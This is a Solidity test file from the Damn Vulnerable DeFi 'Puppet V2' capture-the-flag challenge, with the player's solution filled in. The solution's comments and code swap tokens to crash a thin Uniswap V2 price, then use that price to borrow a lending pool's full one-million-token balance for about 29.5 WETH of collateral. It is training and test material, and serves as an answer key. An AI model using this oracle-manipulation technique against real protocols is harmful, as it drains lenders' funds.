// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                string.concat(
                    vm.projectRoot(),
                    "/builds/uniswap/UniswapV2Factory.json"
                ),
                abi.encode(address(0))
            )
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(
                    vm.projectRoot(),
                    "/builds/uniswap/UniswapV2Router02.json"
                ),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(token), address(weth))
        );

        // Deploy the lending pool
        lendingPool = new PuppetV2Pool(
            address(weth),
            address(token),
            address(uniswapV2Exchange),
            address(uniswapV2Factory)
        );

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(
            token.balanceOf(address(lendingPool)),
            POOL_INITIAL_TOKEN_BALANCE
        );
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(
            lendingPool.calculateDepositOfWETHRequired(1 ether),
            0.3 ether
        );
        assertEq(
            lendingPool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            ),
            300000 ether
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        /*
            To solve this challenge we need to exploit the UniswapV2 and lower the price of DVT tokens
            The strategy is as follows:
            player: 20 ETH and 10000 DVT
            uniswap: 10 ETH and 100 DVT

            1. The player swaps 10000 DVT for ETH
               NOTE: we need to approve the uniswap router to use our 10000 DVT
               in order for them to be transfered to the uniswap router
            2. After the player swaps 10_000 DVT for ETH
                NOTE: the uniswap will directly transfer the ETH amount to the players address
                player: 29.9 ETH and 0 DVT
                uniswap: 0.1 ETH and 10_100 DVT
            With such pool disbalance in the uniswap pair now the price of 1 DVT is incredibly low
            3. Now, the player need to deposit the 29.9 ETH to the weth IERC20
            4. After depositing player's ETH balance we have to approve the lendingPool to use our ETH
            5. Player calls borrow with 1_000_000 DVT tokens to borrow
                NOTE: Now the `calculateDepositOfWETHRequired` will return ~29.49 ETH
            6. The pool successfully transfers all DVT tokens to the player
            7. The player directly transfers the DVTs to recovery
            
            NOTE:
            BEFORE SWAP
            player: 20 ETH | 10_000 DVT
            uniswap: 10 ETH | 100 DVT
            depositWETHRequired = 300_000 ETH
            for 1_000_000 DVT we need 300_000 ETH deposit collateral

            AFTER SWAP
            player: 29.9 ETH | 0 DVT
            uniswap: 0.1 ETH | 10_100 DVT
            depositWETHRequired = 29.49 ETH
            for 1_000_000 DVT we need 29.49 ETH ETH deposit collateral            
        */

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        token.approve(address(uniswapV2Router), token.balanceOf(player));

        uniswapV2Router.swapExactTokensForETH(
            token.balanceOf(player),
            9 ether,
            path,
            address(player),
            block.timestamp + 1
        );

        weth.deposit{value: player.balance}();
        weth.approve(address(lendingPool), weth.balanceOf(player));
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery, token.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(
            token.balanceOf(address(lendingPool)),
            0,
            "Lending pool still has tokens"
        );
        assertEq(
            token.balanceOf(recovery),
            POOL_INITIAL_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}
